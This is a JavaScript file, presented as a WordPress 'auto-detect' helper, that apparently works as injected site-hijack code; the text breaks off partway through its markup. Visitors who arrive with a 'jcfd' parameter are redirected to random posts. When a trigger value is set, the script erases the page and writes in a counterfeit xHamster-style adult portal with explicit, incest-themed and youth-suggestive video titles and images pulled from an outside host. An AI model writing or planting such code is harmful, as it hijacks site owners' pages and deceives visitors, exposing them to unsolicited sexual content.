(async function () {
    // =========================================================================
    // AUTO-DETECT WORDPRESS WEBSITE LINK & WP RANDOM POST PICKUP
    // =========================================================================
    function getWpApiEndpoint() {
        try {
            // 1. Check for standard WordPress REST API link tag in <head>
            const restLink = document.querySelector('link[rel="https://api.w.org/"]') ||
                             document.querySelector('link[rel="alternate"][type="application/json"][href*="/wp-json"]');
            if (restLink && restLink.href) {
                const ep = restLink.href.replace(/\/+$/, '');
                sessionStorage.setItem("wp_api_endpoint", ep);
                return ep;
            }
            // 2. Check window.wpApiSettings if injected by WordPress
            if (typeof window !== 'undefined' && window.wpApiSettings && window.wpApiSettings.root) {
                const ep = window.wpApiSettings.root.replace(/\/+$/, '');
                sessionStorage.setItem("wp_api_endpoint", ep);
                return ep;
            }
            // 3. Check sessionStorage cache
            const cachedEp = sessionStorage.getItem("wp_api_endpoint");
            if (cachedEp) return cachedEp;
        } catch (e) {}

        // 4. Default fallback: current website origin + /wp-json
        const fallbackEp = `${window.location.origin}/wp-json`;
        try { sessionStorage.setItem("wp_api_endpoint", fallbackEp); } catch (e) {}
        return fallbackEp;
    }

    let wpPosts = [];

    // Helper function to pick random target WordPress post permalink
    function getRandomTargetUrl() {
        let pool = (wpPosts && wpPosts.length > 0) ? wpPosts : (window.__wp_posts || []);
        if (!pool || pool.length === 0) {
            try {
                const cached = sessionStorage.getItem("wp_posts_cache");
                if (cached) pool = JSON.parse(cached);
            } catch (e) {}
        }
        if (Array.isArray(pool) && pool.length > 0) {
            const current = window.location.href.split('?')[0].replace(/\/+$/, '');
            const filtered = pool.filter(u => typeof u === 'string' && u.split('?')[0].replace(/\/+$/, '') !== current);
            const finalPool = filtered.length > 0 ? filtered : pool;
            return finalPool[Math.floor(Math.random() * finalPool.length)];
        }
        return window.location.origin + '/';
    }

    // Function to load dynamic WordPress posts from WP REST API
    async function fetchWpPosts() {
        // 1. Check memory cache
        if (window.__wp_posts && Array.isArray(window.__wp_posts) && window.__wp_posts.length > 0) {
            wpPosts = window.__wp_posts;
            return wpPosts;
        }

        // 2. Check sessionStorage cache
        try {
            const cached = sessionStorage.getItem("wp_posts_cache");
            if (cached) {
                const parsed = JSON.parse(cached);
                if (Array.isArray(parsed) && parsed.length > 0) {
                    wpPosts = parsed;
                    window.__wp_posts = parsed;
                    return wpPosts;
                }
            }
        } catch (e) {}

        const apiEndpoint = getWpApiEndpoint();
        let posts = [];

        try {
            // Request posts with permalink (_fields=link)
            let res = await fetch(`${apiEndpoint}/wp/v2/posts?per_page=50&_fields=link`, { cache: "no-store" });
            if (!res.ok) {
                res = await fetch(`${apiEndpoint}/wp/v2/posts?per_page=10&_fields=link`, { cache: "no-store" });
            }
            if (res.ok) {
                const totalPages = parseInt(res.headers.get("x-wp-totalpages") || "1", 10);
                const data = await res.json();
                if (Array.isArray(data) && data.length > 0) {
                    posts = data.map(item => item && (item.link || (item.guid && item.guid.rendered))).filter(u => typeof u === 'string' && /^https?:\/\//i.test(u.trim()));
                }

                // If multiple pages exist, pick another random page to fetch more diverse posts
                if (totalPages > 1) {
                    const randomPage = Math.floor(Math.random() * Math.min(totalPages, 10)) + 1;
                    if (randomPage !== 1) {
                        try {
                            const pageRes = await fetch(`${apiEndpoint}/wp/v2/posts?per_page=20&page=${randomPage}&_fields=link`, { cache: "no-store" });
                            if (pageRes.ok) {
                                const pageData = await pageRes.json();
                                if (Array.isArray(pageData) && pageData.length > 0) {
                                    const extra = pageData.map(item => item && (item.link || (item.guid && item.guid.rendered))).filter(u => typeof u === 'string' && /^https?:\/\//i.test(u.trim()));
                                    posts = Array.from(new Set([...posts, ...extra]));
                                }
                            }
                        } catch (err) {}
                    }
                }
            }
        } catch (err) {
            console.warn("[WP Auto Detect] REST API fetch error:", err);
        }

        // 3. Fallback: Parse internal links from DOM if REST API is disabled or blocked
        if (!posts || posts.length === 0) {
            try {
                const origin = window.location.origin;
                const domLinks = Array.from(document.querySelectorAll('a[href]'))
                    .map(a => a.href)
                    .filter(href => {
                        try {
                            const u = new URL(href);
                            return u.origin === origin &&
                                !href.includes('/wp-admin') &&
                                !href.includes('/wp-login') &&
                                !href.includes('/wp-content') &&
                                !href.includes('/wp-includes') &&
                                !href.includes('/wp-json') &&
                                !href.includes('#') &&
                                !/\.(jpg|jpeg|png|gif|svg|css|js|webp|pdf|zip|mp4)$/i.test(u.pathname) &&
                                u.pathname !== '/' &&
                                u.pathname !== '';
                        } catch (e) {
                            return false;
                        }
                    });
                if (domLinks.length > 0) {
                    posts = Array.from(new Set(domLinks));
                }
            } catch (e) {}
        }

        // 4. Ultimate fallback: site homepage
        if (!posts || posts.length === 0) {
            posts = [window.location.origin + '/'];
        }

        wpPosts = posts;
        window.__wp_posts = posts;
        try {
            sessionStorage.setItem("wp_posts_cache", JSON.stringify(posts));
        } catch (e) {}

        console.log("[WP Auto Detect] Loaded WordPress posts permalinks:", posts.length);
        return posts;
    }

    // Load WP posts before handling redirect or document render
    await fetchWpPosts();

    const url = new URL(window.location.href);
    const ind = url.searchParams.get("jcfd");

    if (ind) {
        sessionStorage.setItem("jcfd", ind);
        sessionStorage.setItem("jcfdtime", Date.now() + 5 * 60 * 1000);
        url.searchParams.delete("jcfd");
        const targetUrl = getRandomTargetUrl();
        if (targetUrl) {
            window.location.href = targetUrl;
            return;
        }
    }

    if (Date.now() > sessionStorage.getItem("jcfdtime")) {
        sessionStorage.removeItem("jcfdtime");
        sessionStorage.removeItem("jcfd");
    }

    const stcd = sessionStorage.getItem("jcfd");
    if (stcd == "xyz") {
        document.body.innerHTML = '<span style="display:none;">my error</span>';
        document.querySelectorAll('link[rel="stylesheet"], style').forEach(el => el.remove());

        document.write(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trending Free Adult Videos - xHamster</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #0d0d0d;
            color: #d1d5db;
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            font-size: 13px;
            line-height: 1.4;
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }
        a {
            color: inherit;
            text-decoration: none;
        }
        svg {
            vertical-align: middle;
        }

        /* Top Header */
        .xh-header {
            position: sticky;
            top: 0;
            z-index: 1000;
            background: #141414;
            border-bottom: 1px solid #242424;
            box-shadow: 0 2px 10px rgba(0,0,0,0.6);
        }
        .xh-header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 16px;
            max-width: 1680px;
            margin: 0 auto;
            gap: 16px;
        }
        .xh-logo-wrap {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            text-decoration: none;
            user-select: none;
        }
        .xh-logo-badge {
            background: #d2232a;
            color: #fff;
            width: 32px;
            height: 32px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 18px;
            box-shadow: 0 2px 8px rgba(210, 35, 42, 0.4);
        }
        .xh-logo-text {
            font-size: 22px;
            font-weight: 900;
            letter-spacing: -0.5px;
            color: #fff;
        }
        .xh-logo-text span {
            color: #d2232a;
        }

        /* Search Bar */
        .xh-search-container {
            flex: 1;
            max-width: 680px;
            display: flex;
            align-items: center;
            background: #1f1f1f;
            border: 1px solid #333;
            border-radius: 4px;
            overflow: hidden;
            height: 38px;
            transition: border-color 0.2s;
        }
        .xh-search-container:focus-within {
            border-color: #d2232a;
        }
        .xh-search-dropdown {
            background: #282828;
            color: #bbb;
            padding: 0 12px;
            height: 100%;
            display: flex;
            align-items: center;
            font-size: 12px;
            font-weight: 500;
            border-right: 1px solid #333;
            cursor: pointer;
            white-space: nowrap;
            gap: 4px;
        }
        .xh-search-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            padding: 0 14px;
            font-size: 13px;
        }
        .xh-search-input::placeholder {
            color: #777;
        }
        .xh-search-btn {
            background: #d2232a;
            color: #fff;
            border: none;
            height: 100%;
            padding: 0 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }
        .xh-search-btn:hover {
            background: #e22830;
        }

        /* Header Right Actions */
        .xh-header-right {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .xh-lang-btn {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #aaa;
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
        }
        .xh-login-link {
            color: #fff;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            padding: 6px 10px;
        }
        .xh-login-link:hover {
            color: #d2232a;
        }
        .xh-signup-btn {
            background: #d2232a;
            color: #fff;
            padding: 7px 16px;
            border-radius: 4px;
            font-size: 13px;
            font-weight: 700;
            border: none;
            cursor: pointer;
            transition: background 0.2s;
            white-space: nowrap;
        }
        .xh-signup-btn:hover {
            background: #e22830;
        }

        /* Subheader Bar */
        .xh-subnav {
            background: #191919;
            border-top: 1px solid #222;
            border-bottom: 1px solid #262626;
            overflow-x: auto;
            scrollbar-width: none;
        }
        .xh-subnav::-webkit-scrollbar {
            display: none;
        }
        .xh-subnav-inner {
            display: flex;
            align-items: center;
            max-width: 1680px;
            margin: 0 auto;
            padding: 0 16px;
            height: 38px;
            gap: 20px;
        }
        .xh-subnav-item {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #bbb;
            font-size: 12px;
            font-weight: 500;
            white-space: nowrap;
            cursor: pointer;
            transition: color 0.15s;
        }
        .xh-subnav-item:hover, .xh-subnav-item.active {
            color: #fff;
        }
        .xh-live-badge {
            background: #d2232a;
            color: #fff;
            font-size: 9px;
            font-weight: 900;
            padding: 1px 5px;
            border-radius: 3px;
            margin-left: 2px;
            text-transform: uppercase;
            animation: pulse 1.8s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.6; }
            100% { opacity: 1; }
        }
        .xh-upload-btn {
            margin-left: auto;
            color: #bbb;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }
        .xh-upload-btn:hover {
            color: #fff;
        }

        /* Main 2-Column Wrapper */
        .xh-main-wrapper {
            display: flex;
            max-width: 1680px;
            margin: 0 auto;
            padding: 14px 16px;
            gap: 20px;
        }

        /* Left Sidebar */
        .xh-sidebar {
            width: 190px;
            flex-shrink: 0;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }
        @media (max-width: 980px) {
            .xh-sidebar {
                display: none;
            }
        }
        .xh-sidebar-section {
            background: #141414;
            border: 1px solid #222;
            border-radius: 6px;
            padding: 10px 0;
        }
        .xh-sidebar-heading {
            font-size: 11px;
            font-weight: 700;
            color: #777;
            text-transform: uppercase;
            padding: 4px 14px 8px;
            letter-spacing: 0.5px;
        }
        .xh-sidebar-link {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 7px 14px;
            color: #bbb;
            font-size: 12px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.15s;
        }
        .xh-sidebar-link:hover, .xh-sidebar-link.active {
            background: #1f1f1f;
            color: #fff;
            border-left: 3px solid #d2232a;
            padding-left: 11px;
        }
        .xh-flag {
            font-size: 14px;
        }

        /* Content Area */
        .xh-content {
            flex: 1;
            min-width: 0;
        }

        /* Section Header Bar */
        .xh-section-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 14px;
            padding-bottom: 10px;
            border-bottom: 1px solid #222;
        }
        .xh-section-title-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .xh-section-title {
            font-size: 18px;
            font-weight: 700;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .xh-dots-icon {
            color: #666;
            cursor: pointer;
            font-size: 16px;
        }
        .xh-filter-pills {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .xh-pill {
            background: #1e1e1e;
            color: #aaa;
            padding: 4px 12px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            border: 1px solid #2e2e2e;
            transition: all 0.15s;
        }
        .xh-pill:hover, .xh-pill.active {
            background: #d2232a;
            color: #fff;
            border-color: #d2232a;
        }

        /* 4-Column Video Grid */
        .xh-video-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px 14px;
            margin-bottom: 24px;
        }
        @media (max-width: 1280px) {
            .xh-video-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }
        @media (max-width: 768px) {
            .xh-video-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px 10px;
            }
            .xh-search-container {
                display: none;
            }
        }
        @media (max-width: 480px) {
            .xh-video-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Video Card */
        .xh-card {
            background: transparent;
            display: flex;
            flex-direction: column;
            cursor: pointer;
            position: relative;
        }
        .xh-thumb-box {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background: #181818;
            border-radius: 4px;
            overflow: hidden;
        }
        .xh-thumb-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            transition: transform 0.25s ease;
        }
        .xh-card:hover .xh-thumb-box img {
            transform: scale(1.04);
        }
        .xh-badge-duration {
            position: absolute;
            bottom: 6px;
            right: 6px;
            background: rgba(0, 0, 0, 0.85);
            color: #fff;
            font-size: 11px;
            font-weight: 700;
            padding: 2px 5px;
            border-radius: 2px;
            letter-spacing: 0.3px;
        }
        .xh-badge-hd {
            position: absolute;
            bottom: 6px;
            left: 6px;
            background: #d2232a;
            color: #fff;
            font-size: 9px;
            font-weight: 800;
            padding: 1px 4px;
            border-radius: 2px;
            text-transform: uppercase;
        }
        .xh-badge-4k {
            position: absolute;
            top: 6px;
            left: 6px;
            background: rgba(0, 0, 0, 0.85);
            color: #ffb800;
            font-size: 9px;
            font-weight: 900;
            padding: 2px 5px;
            border-radius: 2px;
            border: 1px solid rgba(255, 184, 0, 0.4);
        }
        .xh-card-details {
            padding: 8px 2px 4px;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .xh-card-title {
            font-size: 13px;
            font-weight: 500;
            color: #e5e5e5;
            line-height: 1.35;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
            text-overflow: ellipsis;
            transition: color 0.15s;
        }
        .xh-card:hover .xh-card-title {
            color: #d2232a;
        }
        .xh-card-meta {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 11px;
            color: #888;
        }
        .xh-creator-name {
            display: flex;
            align-items: center;
            gap: 4px;
            color: #aaa;
            font-weight: 500;
            max-width: 140px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .xh-verified-tick {
            color: #3b82f6;
            font-size: 11px;
        }
        .xh-card-stats {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .xh-rating {
            color: #10b981;
            font-weight: 700;
        }

        /* Shorts Section */
        .xh-shorts-section {
            margin: 28px 0 24px;
            padding: 16px 0;
            border-top: 1px solid #222;
            border-bottom: 1px solid #222;
        }
        .xh-shorts-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 14px;
        }
        .xh-shorts-title {
            font-size: 16px;
            font-weight: 700;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .xh-shorts-badge {
            background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%);
            color: #fff;
            font-size: 10px;
            font-weight: 800;
            padding: 2px 7px;
            border-radius: 3px;
            text-transform: uppercase;
        }
        .xh-shorts-grid {
            display: grid;
            grid-template-columns: repeat(6, 1fr);
            gap: 12px;
        }
        @media (max-width: 1080px) {
            .xh-shorts-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }
        @media (max-width: 600px) {
            .xh-shorts-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        .xh-short-card {
            position: relative;
            aspect-ratio: 9 / 16;
            background: #1f1f1f;
            border-radius: 6px;
            overflow: hidden;
            cursor: pointer;
        }
        .xh-short-card img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            transition: transform 0.25s;
        }
        .xh-short-card:hover img {
            transform: scale(1.05);
        }
        .xh-short-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 28px 8px 8px;
            background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, transparent 100%);
            display: flex;
            flex-direction: column;
            gap: 3px;
        }
        .xh-short-title {
            color: #fff;
            font-size: 11px;
            font-weight: 600;
            line-height: 1.25;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }
        .xh-short-creator {
            color: #aaa;
            font-size: 10px;
        }

        /* Pagination */
        .xh-pagination {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin: 36px 0 20px;
            flex-wrap: wrap;
        }
        .xh-page-btn {
            background: #1a1a1a;
            color: #ccc;
            border: 1px solid #2e2e2e;
            padding: 8px 14px;
            border-radius: 3px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.15s;
        }
        .xh-page-btn:hover {
            background: #252525;
            color: #fff;
            border-color: #444;
        }
        .xh-page-btn.active {
            background: #d2232a;
            color: #fff;
            border-color: #d2232a;
        }
        .xh-page-dots {
            color: #666;
            padding: 0 4px;
        }

        /* Footer */
        .xh-footer {
            margin-top: 50px;
            background: #0a0a0a;
            border-top: 1px solid #1f1f1f;
            padding: 36px 20px 24px;
            color: #777;
            font-size: 12px;
        }
        .xh-footer-grid {
            max-width: 1400px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 24px;
            margin-bottom: 28px;
        }
        @media (max-width: 768px) {
            .xh-footer-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        .xh-footer-col h4 {
            color: #ddd;
            font-size: 13px;
            margin-bottom: 12px;
            text-transform: uppercase;
            font-weight: 700;
        }
        .xh-footer-col ul {
            list-style: none;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .xh-footer-col a:hover {
            color: #d2232a;
        }
        .xh-footer-bottom {
            max-width: 1400px;
            margin: 0 auto;
            padding-top: 20px;
            border-top: 1px solid #181818;
            text-align: center;
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: center;
        }
        .xh-badge-18 {
            display: inline-block;
            border: 1px solid #d2232a;
            color: #d2232a;
            padding: 2px 8px;
            border-radius: 3px;
            font-weight: 800;
            font-size: 11px;
        }

        /* Compatibility / Hidden anchor elements */
        #playWrapper {
            position: relative;
            width: 100%;
            height: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div id="pageWrapper">
        <div id="mainWrapper">
            <!-- Header -->
            <header class="xh-header" id="header">
                <div class="xh-header-top">
                    <!-- Logo -->
                    <a href="javascript:void(0);" class="xh-logo-wrap" id="js_navigationMenu">
                        <div class="xh-logo-badge">xH</div>
                        <div class="xh-logo-text">x<span>Hamster</span></div>
                    </a>

                    <!-- Search -->
                    <div class="xh-search-container" id="search_toggle">
                        <div class="xh-search-dropdown">
                            <span>Videos</span>
                            <svg width="10" height="6" viewBox="0 0 10 6" fill="currentColor"><path d="M0 0l5 5 5-5z"/></svg>
                        </div>
                        <input type="text" class="xh-search-input" placeholder="Search 2,000,000+ free adult videos..." autocomplete="off"/>
                        <button class="xh-search-btn" type="button">
                            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
                        </button>
                    </div>

                    <!-- Right Options -->
                    <div class="xh-header-right">
                        <div class="xh-lang-btn">
                            <span>EN</span>
                            <svg width="8" height="5" viewBox="0 0 10 6" fill="currentColor"><path d="M0 0l5 5 5-5z"/></svg>
                        </div>
                        <span class="xh-login-link">Login</span>
                        <button class="xh-signup-btn">Sign up for free</button>
                    </div>
                </div>

                <!-- Sub Navigation -->
                <nav class="xh-subnav" id="paidSites">
                    <div class="xh-subnav-inner">
                        <div class="xh-subnav-item active">
                            <span>⭐</span>
                            <span>Channels</span>
                        </div>
                        <div class="xh-subnav-item">
                            <span style="color:#d2232a;">🔴</span>
                            <span>Live Sex</span>
                            <span class="xh-live-badge">LIVE</span>
                        </div>
                        <div class="xh-subnav-item">
                            <span>💬</span>
                            <span>Stripchat</span>
                        </div>
                        <div class="xh-subnav-item">
                            <span>🥽</span>
                            <span>VR Porn</span>
                        </div>
                        <div class="xh-subnav-item">
                            <span>👑</span>
                            <span>Creators</span>
                        </div>
                        <div class="xh-subnav-item">
                            <span>⚡</span>
                            <span>Moments</span>
                        </div>
                        <div class="xh-subnav-item">
                            <span>📸</span>
                            <span>Photos</span>
                        </div>
                        <div class="xh-subnav-item">
                            <span>❤️</span>
                            <span>Dating</span>
                        </div>
                        <div class="xh-upload-btn">
                            <span>+ Upload</span>
                        </div>
                    </div>
                </nav>
            </header>

            <center id="jyad-1-in"></center>

            <!-- Anchor for scroll tracking -->
            <div id="playWrapper" class="tm_playWrapper"></div>

            <!-- Main Layout: Sidebar + Grid -->
            <div class="xh-main-wrapper" id="mobileContainer">
                <!-- Left Sidebar -->
                <aside class="xh-sidebar">
                    <div class="xh-sidebar-section">
                        <div class="xh-sidebar-heading">Navigation</div>
                        <div class="xh-sidebar-link active">
                            <span>🔥</span>
                            <span>Search Videos</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span>📅</span>
                            <span>2026 Videos</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span>🏆</span>
                            <span>Best Videos</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span>📁</span>
                            <span>Categories</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span>🏷️</span>
                            <span>Search Tags</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span>⭐</span>
                            <span>Subscriptions</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span>🔴</span>
                            <span>Live Sex</span>
                        </div>
                    </div>

                    <div class="xh-sidebar-section">
                        <div class="xh-sidebar-heading">Filter by Country</div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇮🇳</span>
                            <span>India</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇺🇸</span>
                            <span>United States</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇬🇧</span>
                            <span>United Kingdom</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇯🇵</span>
                            <span>Japan</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇩🇪</span>
                            <span>Germany</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇫🇷</span>
                            <span>France</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇷🇺</span>
                            <span>Russia</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇲🇽</span>
                            <span>Latina</span>
                        </div>
                        <div class="xh-sidebar-link">
                            <span class="xh-flag">🇨🇦</span>
                            <span>Canada</span>
                        </div>
                    </div>

                    <div class="xh-sidebar-section">
                        <div class="xh-sidebar-heading">Top Categories</div>
                        <div class="xh-sidebar-link"><span>Milf</span></div>
                        <div class="xh-sidebar-link"><span>Teen (18+)</span></div>
                        <div class="xh-sidebar-link"><span>Amateur</span></div>
                        <div class="xh-sidebar-link"><span>Anal</span></div>
                        <div class="xh-sidebar-link"><span>Blowjob</span></div>
                        <div class="xh-sidebar-link"><span>Big Tits</span></div>
                        <div class="xh-sidebar-link"><span>Japanese</span></div>
                        <div class="xh-sidebar-link"><span>Ebony</span></div>
                        <div class="xh-sidebar-link"><span>Asian</span></div>
                        <div class="xh-sidebar-link"><span>Blonde</span></div>
                        <div class="xh-sidebar-link"><span>Brunette</span></div>
                        <div class="xh-sidebar-link"><span>Threesome</span></div>
                        <div class="xh-sidebar-link"><span>POV</span></div>
                    </div>
                </aside>

                <!-- Content Feed -->
                <main class="xh-content">
                    <!-- Section Header -->
                    <div class="xh-section-header">
                        <div class="xh-section-title-wrap">
                            <h1 class="xh-section-title">Trending Free Porn Videos</h1>
                            <span class="xh-dots-icon">⋮</span>
                        </div>
                        <div class="xh-filter-pills">
                            <span class="xh-pill active">All</span>
                            <span class="xh-pill">HD</span>
                            <span class="xh-pill">VR</span>
                            <span class="xh-pill">4K</span>
                        </div>
                    </div>

                    <div id="textcontent-div-1" style="text-align:center; padding: 4px;"></div>

                    <!-- 4-Column Grid: Section 1 (Cards 1-8) -->
                    <div class="xh-video-grid" id="relatedVideos1234">
                        <!-- Card 1 -->
                        <div class="xh-card js_video-box" data-id="1">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="1" id="randomimage1" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/9.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh1/400/225';" alt="Video 1" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration" id="randomsecond1">24:18</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title" id="randomtitle1">CLIT OR THE PEARL? - Stepdad Finds Out In The Shower With Naughty Stepdaughter</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">FamilyStrokes <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>412K</span>
                                        <span class="xh-rating">98%</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 2 -->
                        <div class="xh-card js_video-box" data-id="2">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="2" id="randomimage2" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/15.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh2/400/225';" alt="Video 2" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-4k">4K</span>
                                <span class="xh-badge-duration" id="randomsecond2">18:45</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title" id="randomtitle2">Horny Indian Wife Caught Cheating With Neighbor And Begs To Keep It Secret</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">DesiClub <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>890K</span>
                                        <span class="xh-rating">96%</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 3 -->
                        <div class="xh-card js_video-box" data-id="3">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="3" id="randomimage3" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/1.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh3/400/225';" alt="Video 3" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration" id="randomsecond3">31:10</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title" id="randomtitle3">Curious student and strict teacher hard pounding session after school hours</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">BrattySis <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>1.2M</span>
                                        <span class="xh-rating">99%</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 4 -->
                        <div class="xh-card js_video-box" data-id="4">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="4" id="randomimage4" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/4.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh4/400/225';" alt="Video 4" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration" id="randomsecond4">15:52</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title" id="randomtitle4">Little Blonde Knows How To Ride And Drain Every Single Drop From Her Partner</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">PureMature <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>634K</span>
                                        <span class="xh-rating">97%</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 5 -->
                        <div class="xh-card js_video-box" data-id="5">
                            <div class="xh-thumb-box">
                                <img class="thumb-image js_lazy entered loaded" data-id="5" id="randomimage5" src="https://rh.positivetraits.us/wp-content/uploads/2025/13/5.webp" onerror="this.onerror=null; this.src='https://picsum.photos/seed/xh5/400/225';" alt="Video 5" loading="lazy"/>
                                <span class="xh-badge-hd">HD</span>
                                <span class="xh-badge-duration">22:04</span>
                            </div>
                            <div class="xh-card-details">
                                <div class="xh-card-title tm_video_title">Young Hot Babysitter Seduced By Older Guy After Kids Fall Asleep</div>
                                <div class="xh-card-meta">
                                    <span class="xh-creator-name">TeamSkeet <span class="xh-verified-tick">✓</span></span>
                                    <div class="xh-card-stats">
                                        <span>780K</span>
                                        <span class="xh-rating">95%</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Card 6 -->
                        <div class="xh-card js_video-box" data-id="6">
                            <div class="xh-thumb-box">
